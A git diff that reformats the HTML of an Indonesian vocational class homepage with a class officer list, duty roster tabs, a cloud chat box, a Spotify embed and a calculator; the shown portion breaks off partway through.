@@ -1,676 +1,1364 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>XI PPLG - UNIVERSE</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=VT323&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="./css/index.css">
-    <link rel="icon" type="image/png" href="./assets/ic32.png">
-</head>
+    <link
+      href="https://fonts.googleapis.com/css2?family=VT323&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="./css/index.css" />
+    <link rel="icon" type="image/png" href="./assets/ic32.png" />
+  </head>
 
-<body class="min-h-screen grid-bg">
-    <div class="fixed inset-0 pointer-events-none overflow-hidden" aria-hidden="true">
-        <svg class="star" style="top: 10%; left: 5%; animation-delay: 0s;" viewBox="0 0 24 24" fill="#FEE440" stroke="#2D2D2D" stroke-width="2"><polygon points="12,2 15,9 22,9 16,14 18,22 12,17 6,22 8,14 2,9 9,9"/></svg>
-        <svg class="star" style="top: 20%; right: 10%; animation-delay: 0.5s;" viewBox="0 0 24 24" fill="#00F5D4" stroke="#2D2D2D" stroke-width="2"><polygon points="12,2 15,9 22,9 16,14 18,22 12,17 6,22 8,14 2,9 9,9"/></svg>
-        <svg class="star" style="top: 60%; left: 8%; animation-delay: 1s;" viewBox="0 0 24 24" fill="#F15BB5" stroke="#2D2D2D" stroke-width="2"><polygon points="12,2 15,9 22,9 16,14 18,22 12,17 6,22 8,14 2,9 9,9"/></svg>
-        <svg class="star" style="top: 75%; right: 5%; animation-delay: 1.5s;" viewBox="0 0 24 24" fill="#9B5DE5" stroke="#2D2D2D" stroke-width="2"><polygon points="12,2 15,9 22,9 16,14 18,22 12,17 6,22 8,14 2,9 9,9"/></svg>
+  <body class="min-h-screen grid-bg">
+    <div
+      class="fixed inset-0 pointer-events-none overflow-hidden"
+      aria-hidden="true"
+    >
+      <svg
+        class="star"
+        style="top: 10%; left: 5%; animation-delay: 0s"
+        viewBox="0 0 24 24"
+        fill="#FEE440"
+        stroke="#2D2D2D"
+        stroke-width="2"
+      >
+        <polygon points="12,2 15,9 22,9 16,14 18,22 12,17 6,22 8,14 2,9 9,9" />
+      </svg>
+      <svg
+        class="star"
+        style="top: 20%; right: 10%; animation-delay: 0.5s"
+        viewBox="0 0 24 24"
+        fill="#00F5D4"
+        stroke="#2D2D2D"
+        stroke-width="2"
+      >
+        <polygon points="12,2 15,9 22,9 16,14 18,22 12,17 6,22 8,14 2,9 9,9" />
+      </svg>
+      <svg
+        class="star"
+        style="top: 60%; left: 8%; animation-delay: 1s"
+        viewBox="0 0 24 24"
+        fill="#F15BB5"
+        stroke="#2D2D2D"
+        stroke-width="2"
+      >
+        <polygon points="12,2 15,9 22,9 16,14 18,22 12,17 6,22 8,14 2,9 9,9" />
+      </svg>
+      <svg
+        class="star"
+        style="top: 75%; right: 5%; animation-delay: 1.5s"
+        viewBox="0 0 24 24"
+        fill="#9B5DE5"
+        stroke="#2D2D2D"
+        stroke-width="2"
+      >
+        <polygon points="12,2 15,9 22,9 16,14 18,22 12,17 6,22 8,14 2,9 9,9" />
+      </svg>
     </div>
 
-  
-    <div id="bootScreen" class="fixed inset-0 bg-black z-[9999] flex items-center justify-center">
-        <div class="text-center">
-            <div class="font-pixel text-4xl md:text-6xl text-white mb-8">PPLG UNIVERSE</div>
-            <div class="w-64 h-6 border-4 border-white rounded-full mx-auto overflow-hidden">
-                <div id="bootProgress" class="h-full bg-gradient-to-r from-purple-500 via-pink-500 to-orange-400 rounded-full" style="width: 0%; transition: width 0.1s linear;"></div>
-            </div>
-            <div id="bootText" class="font-pixel text-lg text-gray-400 mt-4">Loading system...</div>
+    <div
+      id="bootScreen"
+      class="fixed inset-0 bg-black z-[9999] flex items-center justify-center"
+    >
+      <div class="text-center">
+        <div class="font-pixel text-4xl md:text-6xl text-white mb-8">
+          PPLG UNIVERSE
         </div>
+        <div
+          class="w-64 h-6 border-4 border-white rounded-full mx-auto overflow-hidden"
+        >
+          <div
+            id="bootProgress"
+            class="h-full bg-gradient-to-r from-purple-500 via-pink-500 to-orange-400 rounded-full"
+            style="width: 0%; transition: width 0.1s linear"
+          ></div>
+        </div>
+        <div id="bootText" class="font-pixel text-lg text-gray-400 mt-4">
+          Loading system...
+        </div>
+      </div>
     </div>
 
-    
     <main id="mainContent" class="opacity-0 transition-opacity duration-500">
-
-        
-        <section class="min-h-screen flex items-center justify-center p-4 md:p-8">
-            <div class="window-y2k w-full max-w-5xl animate-slideUp" style="animation-delay: 0.3s;">
-                <div class="title-bar-y2k">
-                    <div class="flex items-center gap-3">
-                        <div class="w-6 h-6 border-2 border-white rounded-md bg-white/20 flex items-center justify-center">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
-                        </div>
-                        <span class="font-pixel text-lg text-white drop-shadow-md">XI PPLG - Homepage.exe</span>
-                    </div>
-                    <div class="flex gap-2">
-                        <button class="win-btn win-btn-min" aria-label="Minimize"><svg width="12" height="2" viewBox="0 0 12 2" fill="currentColor"><rect width="12" height="2"/></svg></button>
-                        <button class="win-btn win-btn-max" aria-label="Maximize"><svg width="12" height="12" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="1" width="10" height="10"/></svg></button>
-                        <button class="win-btn win-btn-close" aria-label="Close"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M6 6l12 12M6 18L18 6"/></svg></button>
-                    </div>
-                </div>
-
-                <div class="p-6 md:p-10 bg-white/80 backdrop-blur-sm">
-                    <div class="grid md:grid-cols-2 gap-8 items-center">
-                        <div>
-                            <div class="inline-flex items-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white font-pixel px-4 py-2 rounded-full border-2 border-[var(--outline)] text-sm mb-6 shadow-lg">
-                                <span class="w-2 h-2 bg-white rounded-full animate-pulse"></span> Tahun Ajaran 2025-2026
-                            </div>
-                            <h1 class="font-pixel text-4xl md:text-6xl text-[var(--text-dark)] mb-4 leading-tight">
-                                XI <span class="text-transparent bg-clip-text bg-gradient-to-r from-purple-500 to-pink-500">PPLG</span>
-                            </h1>
-                            <p class="text-lg text-gray-600 mb-6 leading-relaxed">
-                                Pengembangan Perangkat Lunak dan Gim - Membekali siswa dengan keterampilan coding, pengembangan aplikasi, dan teknologi digital untuk masa depan.
-                            </p>
-                            <div class="flex flex-wrap gap-3">
-                                <button class="btn-y2k btn-primary" onclick="scrollToSection('struktur')">Explore Class</button>
-                            </div>
-                        </div>
-
-                        <div class="relative">
-                            <div class="grid grid-cols-2 gap-4">
-                                <div class="role-card-y2k">
-                                    <div class="text-3xl font-bold text-purple-500 font-pixel">39</div>
-                                    <div class="text-sm text-gray-500 mt-1">Siswa Aktif</div>
-                                </div>
-                                <div class="role-card-y2k">
-                                    <div class="text-3xl font-bold text-pink-500 font-pixel">12</div>
-                                    <div class="text-sm text-gray-500 mt-1">Pengurus</div>
-                                </div>
-                                <div class="role-card-y2k">
-                                    <div class="text-3xl font-bold text-teal-500 font-pixel">5+</div>
-                                    <div class="text-sm text-gray-500 mt-1">Proyek</div>
-                                </div>
-                                <div class="role-card-y2k">
-                                    <div class="text-3xl font-bold text-orange-500 font-pixel">A</div>
-                                    <div class="text-sm text-gray-500 mt-1">Akreditasi</div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+      <section class="min-h-screen flex items-center justify-center p-4 md:p-8">
+        <div
+          class="window-y2k w-full max-w-5xl animate-slideUp"
+          style="animation-delay: 0.3s"
+        >
+          <div class="title-bar-y2k">
+            <div class="flex items-center gap-3">
+              <div
+                class="w-6 h-6 border-2 border-white rounded-md bg-white/20 flex items-center justify-center"
+              >
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="white">
+                  <rect x="3" y="3" width="7" height="7" />
+                  <rect x="14" y="3" width="7" height="7" />
+                  <rect x="3" y="14" width="7" height="7" />
+                  <rect x="14" y="14" width="7" height="7" />
+                </svg>
+              </div>
+              <span class="font-pixel text-lg text-white drop-shadow-md"
+                >XI PPLG - Homepage.exe</span
+              >
             </div>
-        </section>
-
-        <section class="py-8 px-4">
-            <div class="max-w-6xl mx-auto">
-                <div class="flex flex-wrap justify-center gap-4 md:gap-8">
-                    <div class="desktop-icon animate-popIn" style="animation-delay: 0.4s;" onclick="scrollToSection('struktur')">
-                        <div class="icon-container bg-gradient-to-br from-purple-300 to-purple-500"><svg width="28" height="28" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="1"><circle cx="12" cy="7" r="4"/><path d="M5 21v-2a6 6 0 0 1 6-6h2a6 6 0 0 1 6 6v2"/></svg></div>
-                        <span class="font-pixel text-sm text-center">Struktur</span>
-                    </div>
-                    <div class="desktop-icon animate-popIn" style="animation-delay: 0.5s;" onclick="scrollToSection('piket')">
-                        <div class="icon-container bg-gradient-to-br from-teal-300 to-teal-500"><svg width="28" height="28" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="1"><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M3 10h18"/><path d="M8 2v4"/><path d="M16 2v4"/></svg></div>
-                        <span class="font-pixel text-sm text-center">Piket</span>
-                    </div>
-                    
-                    <div class="desktop-icon animate-popIn" style="animation-delay: 0.6s;" onclick="scrollToSection('chat')">
-                        <div class="icon-container bg-gradient-to-br from-pink-300 to-pink-500 relative">
-                            <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
-                            <span class="absolute top-1 right-1 w-3 h-3 bg-green-400 border-2 border-white rounded-full animate-pulse"></span>
-                        </div>
-                        <span class="font-pixel text-sm text-center">Chat</span>
-                    </div>
-                    <div class="desktop-icon animate-popIn" style="animation-delay: 0.7s;" onclick="window.location.href='./games.html'"> 
-                        <div class="icon-container bg-gradient-to-br from-orange-300 to-orange-500"><svg width="28" height="28" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="1"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 12h4"/><path d="M8 10v4"/><circle cx="17" cy="10" r="1"/><circle cx="15" cy="12" r="1"/></svg></div>
-                        <span class="font-pixel text-sm text-center">Games</span>
-                    </div>
-                 
-                    <div class="desktop-icon animate-popIn" style="animation-delay: 0.8s;" onclick="window.location.href='./materi.html'"> 
-                        <div class="icon-container bg-gradient-to-br from-purple-300 to-purple-500">
-                            <svg width="28" height="28" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="1">
-                                <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/>
-                                <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/>
-                                <path d="M8 7h8"/>
-                                <path d="M8 11h6"/>
-                                <path d="M8 15h4"/>
-                            </svg>
-                        </div>
-                        <span class="font-pixel text-sm text-center">Materi</span>
-                    </div>
-                </div>
+            <div class="flex gap-2">
+              <button class="win-btn win-btn-min" aria-label="Minimize">
+                <svg
+                  width="12"
+                  height="2"
+                  viewBox="0 0 12 2"
+                  fill="currentColor"
+                >
+                  <rect width="12" height="2" />
+                </svg>
+              </button>
+              <button class="win-btn win-btn-max" aria-label="Maximize">
+                <svg
+                  width="12"
+                  height="12"
+                  viewBox="0 0 12 12"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                >
+                  <rect x="1" y="1" width="10" height="10" />
+                </svg>
+              </button>
+              <button class="win-btn win-btn-close" aria-label="Close">
+                <svg
+                  width="12"
+                  height="12"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="3"
+                >
+                  <path d="M6 6l12 12M6 18L18 6" />
+                </svg>
+              </button>
             </div>
-        </section>
+          </div>
 
-      
-        <section id="struktur" class="py-16 px-4">
-            <div class="max-w-5xl mx-auto">
-                <div class="window-y2k">
-                    <div class="title-bar-y2k" style="background: linear-gradient(90deg, #9B5DE5, #F15BB5);">
-                        <span class="font-pixel text-lg text-white drop-shadow-md">Struktur_Kelas.exe</span>
-                        <div class="flex gap-2">
-                            <button class="win-btn win-btn-min"><svg width="12" height="2" viewBox="0 0 12 2" fill="currentColor"><rect width="12" height="2"/></svg></button>
-                            <button class="win-btn win-btn-close"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M6 6l12 12M6 18L18 6"/></svg></button>
-                        </div>
-                    </div>
-                    <div class="p-6 md:p-8 bg-white/90">
-                        <h2 class="font-pixel text-2xl md:text-3xl text-[var(--text-dark)] mb-8 text-center">Pengurus Kelas</h2>
-                        <div class="flex justify-center mb-8">
-                            <div class="role-card-y2k w-full max-w-xs border-l-4 border-purple-500">
-                                <div class="w-16 h-16 mx-auto rounded-full border-4 border-purple-500 bg-gradient-to-br from-purple-300 to-purple-500 flex items-center justify-center mb-3">
-                                    <svg width="32" height="32" viewBox="0 0 24 24" fill="white"><circle cx="12" cy="7" r="4"/><path d="M5 21v-2a6 6 0 0 1 6-6h2a6 6 0 0 1 6 6v2"/></svg>
-                                </div>
-                                <div class="font-pixel text-xs text-purple-500 uppercase tracking-wide">Wali Kelas</div>
-                                <div class="font-bold text-lg text-[var(--text-dark)] mt-1">Erlina Baharuddin, S.Kom</div>
-                            </div>
-                        </div>
-                        <div class="grid md:grid-cols-2 gap-4 mb-8">
-                            <div class="role-card-y2k border-l-4 border-pink-500">
-                                <div class="font-pixel text-xs text-pink-500">Ketua Kelas</div>
-                                <div class="font-bold text-[var(--text-dark)] mt-1">Zidan Muhammad Sauki</div>
-                            </div>
-                            <div class="role-card-y2k border-l-4 border-teal-500">
-                                <div class="font-pixel text-xs text-teal-500">Wakil Ketua</div>
-                                <div class="font-bold text-[var(--text-dark)] mt-1">Zaim Raji Habibi</div>
-                            </div>
-                        </div>
-                        <div class="grid md:grid-cols-2 gap-4 mb-8">
-                            <div class="bg-purple-50 border-3 border-[var(--outline)] rounded-xl p-4">
-                                <div class="font-pixel text-sm text-purple-500 mb-3">Sekretaris</div>
-                                <div class="space-y-2">
-                                    <div class="flex items-center gap-2 text-sm"><span class="w-6 h-6 bg-purple-200 rounded-full flex items-center justify-center text-xs font-bold text-purple-600">1</span> Dzikra Humairo.S</div>
-                                    <div class="flex items-center gap-2 text-sm"><span class="w-6 h-6 bg-purple-200 rounded-full flex items-center justify-center text-xs font-bold text-purple-600">2</span> Rania Larasati Quinn</div>
-                                </div>
-                            </div>
-                            <div class="bg-orange-50 border-3 border-[var(--outline)] rounded-xl p-4">
-                                <div class="font-pixel text-sm text-orange-500 mb-3">Bendahara</div>
-                                <div class="space-y-2">
-                                    <div class="flex items-center gap-2 text-sm"><span class="w-6 h-6 bg-orange-200 rounded-full flex items-center justify-center text-xs font-bold text-orange-600">1</span> Khayla Mazaya</div>
-                                    <div class="flex items-center gap-2 text-sm"><span class="w-6 h-6 bg-orange-200 rounded-full flex items-center justify-center text-xs font-bold text-orange-600">2</span> Naila Nurul Dzihni</div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="grid md:grid-cols-3 gap-4">
-                            <div class="role-card-y2k bg-red-50">
-                                <div class="font-pixel text-xs text-red-500 mb-2">Seksi Agama</div>
-                                <div class="text-sm text-[var(--text-dark)]">
-                                    <p>Rafiq Al Habib</p>
-                                    <p>M Fathul Al-Fath</p>
-                                </div>
-                            </div>
-                            <div class="role-card-y2k bg-yellow-50">
-                                <div class="font-pixel text-xs text-yellow-600 mb-2">Seksi Keamanan</div>
-                                <div class="text-sm text-[var(--text-dark)]">
-                                    <p>Abiyyu Athalian</p>
-                                    <p>Rafi Hibatullah</p>
-                                </div>
-                            </div>
-                            <div class="role-card-y2k bg-green-50">
-                                <div class="font-pixel text-xs text-green-500 mb-2">Seksi Kebersihan</div>
-                                <div class="text-sm text-[var(--text-dark)]">
-                                    <p>Fairuz Dzikri Harofi</p>
-                                    <p>Abdul Muhaimin</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
+          <div class="p-6 md:p-10 bg-white/80 backdrop-blur-sm">
+            <div class="grid md:grid-cols-2 gap-8 items-center">
+              <div>
+                <div
+                  class="inline-flex items-center gap-2 bg-gradient-to-r from-purple-500 to-pink-500 text-white font-pixel px-4 py-2 rounded-full border-2 border-[var(--outline)] text-sm mb-6 shadow-lg"
+                >
+                  <span
+                    class="w-2 h-2 bg-white rounded-full animate-pulse"
+                  ></span>
+                  Tahun Ajaran 2025-2026
                 </div>
-            </div>
-        </section>
-
-        
-        <section id="piket" class="py-16 px-4">
-            <div class="max-w-5xl mx-auto">
-                <div class="window-y2k">
-                    <div class="title-bar-y2k" style="background: linear-gradient(90deg, #00BBF9, #00F5D4);"><span class="font-pixel text-lg text-white drop-shadow-md">Jadwal_Piket.db</span></div>
-                    <div class="p-6 md:p-8 bg-white/90">
-                        <div class="flex border-b-3 border-[var(--outline)] mb-6 overflow-x-auto">
-                            <button class="tab-y2k active" data-day="senin">Senin</button>
-                            <button class="tab-y2k" data-day="selasa">Selasa</button>
-                            <button class="tab-y2k" data-day="rabu">Rabu</button>
-                            <button class="tab-y2k" data-day="kamis">Kamis</button>
-                            <button class="tab-y2k" data-day="jumat">Jumat</button>
-                        </div>
-                        <div id="piketContent"></div>
-                    </div>
+                <h1
+                  class="font-pixel text-4xl md:text-6xl text-[var(--text-dark)] mb-4 leading-tight"
+                >
+                  XI
+                  <span
+                    class="text-transparent bg-clip-text bg-gradient-to-r from-purple-500 to-pink-500"
+                    >PPLG</span
+                  >
+                </h1>
+                <p class="text-lg text-gray-600 mb-6 leading-relaxed">
+                  Pengembangan Perangkat Lunak dan Gim - Membekali siswa dengan
+                  keterampilan coding, pengembangan aplikasi, dan teknologi
+                  digital untuk masa depan.
+                </p>
+                <div class="flex flex-wrap gap-3">
+                  <button
+                    class="btn-y2k btn-primary"
+                    onclick="scrollToSection('struktur')"
+                  >
+                    Explore Class
+                  </button>
                 </div>
-            </div>
-        </section>
+              </div>
 
-        
-        <section id="chat" class="py-16 px-4">
-            <div class="max-w-5xl mx-auto">
-                <div class="window-y2k">
-                    <div class="title-bar-y2k" style="background: linear-gradient(90deg, #F15BB5, #FEE440);">
-                        <div class="flex items-center gap-3">
-                            <span class="font-pixel text-lg text-white drop-shadow-md">Global Messenger</span>
-                            <span class="bg-white/30 px-2 py-1 rounded-full text-xs text-white font-pixel animate-pulse">LIVE</span>
-                        </div>
+              <div class="relative">
+                <div class="grid grid-cols-2 gap-4">
+                  <div class="role-card-y2k">
+                    <div class="text-3xl font-bold text-purple-500 font-pixel">
+                      39
                     </div>
-                    <div class="p-6 md:p-8 bg-gradient-to-b from-gray-100 to-white min-h-[400px] flex flex-col">
-
-                        
-                        <div id="chatBox" class="flex-1 space-y-4 overflow-y-auto mb-6 pr-2" style="max-height: 350px;">
-                            <div class="text-center text-gray-400 font-pixel text-xs py-8">Memuat data dari Cloud...</div>
-                        </div>
-
-                        
-                        <div class="border-t-3 border-[var(--outline)] pt-4 mt-auto space-y-3">
-                            <div class="flex gap-3">
-                                <input type="text" id="chatName" class="input-y2k w-1/3" placeholder="Nama..." maxlength="15">
-                                <input type="text" id="chatMessage" class="input-y2k flex-1" placeholder="Ketik pesan..." maxlength="200" onkeypress="if(event.key==='Enter')sendMessage()">
-                            </div>
-                            <div class="flex gap-3 justify-between">
-                                <button class="btn-y2k btn-pink" onclick="sendMessage()">KIRIM KE CLOUD</button>
-                            </div>
-                        </div>
+                    <div class="text-sm text-gray-500 mt-1">Siswa Aktif</div>
+                  </div>
+                  <div class="role-card-y2k">
+                    <div class="text-3xl font-bold text-pink-500 font-pixel">
+                      12
                     </div>
+                    <div class="text-sm text-gray-500 mt-1">Pengurus</div>
+                  </div>
+                  <div class="role-card-y2k">
+                    <div class="text-3xl font-bold text-teal-500 font-pixel">
+                      5+
+                    </div>
+                    <div class="text-sm text-gray-500 mt-1">Proyek</div>
+                  </div>
+                  <div class="role-card-y2k">
+                    <div class="text-3xl font-bold text-orange-500 font-pixel">
+                      A
+                    </div>
+                    <div class="text-sm text-gray-500 mt-1">Akreditasi</div>
+                  </div>
                 </div>
+              </div>
             </div>
-        </section>
+          </div>
+        </div>
+      </section>
 
-        
-        <section id="games" class="py-16 px-4">
-            <div class="max-w-5xl mx-auto">
-                <div class="grid md:grid-cols-2 gap-8">
-                    
-                    <!-- SPOTIFY PLAYLIST PLAYER - Replacing Tebak Angka -->
-                    <div class="window-y2k">
-                        <div class="title-bar-y2k" style="background: linear-gradient(90deg, #1DB954, #191414);">
-                            <span class="font-pixel text-lg text-white drop-shadow-md">Spotify_Playlist.exe</span>
-                        </div>
-                        <div class="p-4 bg-white/90">
-                            <div class="text-center mb-4">
-                                <div class="inline-flex items-center gap-2 bg-gradient-to-r from-green-500 to-black text-white font-pixel px-4 py-2 rounded-full border-2 border-[var(--outline)] text-sm mb-2">
-                                    <span class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span> NOW PLAYING
-                                </div>
-                            </div>
-                            
-                            <!-- Spotify Embed Player -->
-                            <div class="spotify-player-container mb-4">
-                                <iframe style="border-radius:12px" 
-                                    src="https://open.spotify.com/embed/playlist/2Bng8T2V76A2VjubwKDbpw?utm_source=generator&theme=0" 
-                                    width="100%" 
-                                    height="352" 
-                                    frameBorder="0" 
-                                    allowfullscreen="" 
-                                    allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" 
-                                    loading="lazy"
-                                    class="rounded-xl border-3 border-[var(--outline)]">
-                                </iframe>
-                            </div>
-                            
-                            <div class="flex gap-2 justify-center">
-                                <a href="https://open.spotify.com/playlist/2Bng8T2V76A2VjubwKDbpw?si=82399354b9054178" 
-                                   target="_blank" 
-                                   class="btn-y2k bg-[#1DB954] text-white flex items-center gap-2 text-sm py-2 px-4">
-                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
-                                        <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/>
-                                    </svg>
-                                    <span class="font-pixel">Buka di Spotify</span>
-                                </a>
-                                <button class="btn-y2k btn-secondary text-sm py-2 px-4" onclick="window.open('https://open.spotify.com/playlist/2Bng8T2V76A2VjubwKDbpw?si=82399354b9054178', '_blank')">
-                                    <span class="font-pixel">Open Web Player</span>
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-                    
-                   
-                    <div id="tools" class="window-y2k">
-                        <div class="title-bar-y2k" style="background: linear-gradient(90deg, #00BBF9, #00F5D4);"><span class="font-pixel text-lg text-white drop-shadow-md">Calculator.app</span></div>
-                        <div class="p-6 bg-white/90">
-                            <div id="calcDisplay" class="bg-gray-100 border-3 border-[var(--outline)] rounded-xl p-4 text-right mb-4 font-pixel text-3xl text-[var(--text-dark)] min-h-[60px] overflow-hidden">0</div>
-                            <div class="grid grid-cols-4 gap-2">
-                                <button class="btn-y2k bg-gray-100 text-lg p-3" onclick="clearCalc()">C</button><button class="btn-y2k bg-gray-100 text-lg p-3" onclick="appendCalc('(')">(</button><button class="btn-y2k bg-gray-100 text-lg p-3" onclick="appendCalc(')')">)</button>
-                                <button class="btn-y2k btn-pink text-lg p-3" onclick="appendCalc('/')">/</button>
-                                <button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('7')">7</button><button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('8')">8</button><button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('9')">9</button>
-                                <button class="btn-y2k btn-secondary text-lg p-3" onclick="appendCalc('*')">x</button>
-                                <button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('4')">4</button><button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('5')">5</button><button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('6')">6</button>
-                                <button class="btn-y2k btn-secondary text-lg p-3" onclick="appendCalc('-')">-</button>
-                                <button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('1')">1</button><button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('2')">2</button><button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('3')">3</button>
-                                <button class="btn-y2k btn-secondary text-lg p-3" onclick="appendCalc('+')">+</button>
-                                <button class="btn-y2k bg-white text-lg p-3 col-span-2" onclick="appendCalc('0')">0</button><button class="btn-y2k bg-white text-lg p-3" onclick="appendCalc('.')">.</button><button class="btn-y2k btn-primary text-lg p-3"
-                                    onclick="calculateCalc()">=</button>
-                            </div>
-                        </div>
-                    </div>
+      <section class="py-8 px-4">
+        <div class="max-w-6xl mx-auto">
+          <div class="flex flex-wrap justify-center gap-4 md:gap-8">
+            <div
+              class="desktop-icon animate-popIn"
+              style="animation-delay: 0.4s"
+              onclick="scrollToSection('struktur')"
+            >
+              <div
+                class="icon-container bg-gradient-to-br from-purple-300 to-purple-500"
+              >
+                <svg
+                  width="28"
+                  height="28"
+                  viewBox="0 0 24 24"
+                  fill="white"
+                  stroke="white"
+                  stroke-width="1"
+                >
+                  <circle cx="12" cy="7" r="4" />
+                  <path d="M5 21v-2a6 6 0 0 1 6-6h2a6 6 0 0 1 6 6v2" />
+                </svg>
+              </div>
+              <span class="font-pixel text-sm text-center">Struktur</span>
+            </div>
+            <div
+              class="desktop-icon animate-popIn"
+              style="animation-delay: 0.5s"
+              onclick="scrollToSection('piket')"
+            >
+              <div
+                class="icon-container bg-gradient-to-br from-teal-300 to-teal-500"
+              >
+                <svg
+                  width="28"
+                  height="28"
+                  viewBox="0 0 24 24"
+                  fill="white"
+                  stroke="white"
+                  stroke-width="1"
+                >
+                  <rect x="3" y="4" width="18" height="18" rx="2" />
+                  <path d="M3 10h18" />
+                  <path d="M8 2v4" />
+                  <path d="M16 2v4" />
+                </svg>
+              </div>
+              <span class="font-pixel text-sm text-center">Piket</span>
+            </div>
+
+            <div
+              class="desktop-icon animate-popIn"
+              style="animation-delay: 0.6s"
+              onclick="scrollToSection('chat')"
+            >
+              <div
+                class="icon-container bg-gradient-to-br from-pink-300 to-pink-500 relative"
+              >
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="white">
+                  <path
+                    d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"
+                  />
+                </svg>
+                <span
+                  class="absolute top-1 right-1 w-3 h-3 bg-green-400 border-2 border-white rounded-full animate-pulse"
+                ></span>
+              </div>
+              <span class="font-pixel text-sm text-center">Chat</span>
+            </div>
+            <div
+              class="desktop-icon animate-popIn"
+              style="animation-delay: 0.7s"
+              onclick="window.location.href = './games.html'"
+            >
+              <div
+                class="icon-container bg-gradient-to-br from-orange-300 to-orange-500"
+              >
+                <svg
+                  width="28"
+                  height="28"
+                  viewBox="0 0 24 24"
+                  fill="white"
+                  stroke="white"
+                  stroke-width="1"
+                >
+                  <rect x="2" y="6" width="20" height="12" rx="2" />
+                  <path d="M6 12h4" />
+                  <path d="M8 10v4" />
+                  <circle cx="17" cy="10" r="1" />
+                  <circle cx="15" cy="12" r="1" />
+                </svg>
+              </div>
+              <span class="font-pixel text-sm text-center">Games</span>
+            </div>
+
+            <div
+              class="desktop-icon animate-popIn"
+              style="animation-delay: 0.8s"
+              onclick="window.location.href = './materi.html'"
+            >
+              <div
+                class="icon-container bg-gradient-to-br from-purple-300 to-purple-500"
+              >
+                <svg
+                  width="28"
+                  height="28"
+                  viewBox="0 0 24 24"
+                  fill="white"
+                  stroke="white"
+                  stroke-width="1"
+                >
+                  <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
+                  <path
+                    d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"
+                  />
+                  <path d="M8 7h8" />
+                  <path d="M8 11h6" />
+                  <path d="M8 15h4" />
+                </svg>
+              </div>
+              <span class="font-pixel text-sm text-center">Materi</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section id="struktur" class="py-16 px-4">
+        <div class="max-w-5xl mx-auto">
+          <div class="window-y2k">
+            <div
+              class="title-bar-y2k"
+              style="background: linear-gradient(90deg, #9b5de5, #f15bb5)"
+            >
+              <span class="font-pixel text-lg text-white drop-shadow-md"
+                >Struktur_Kelas.exe</span
+              >
+              <div class="flex gap-2">
+                <button class="win-btn win-btn-min">
+                  <svg
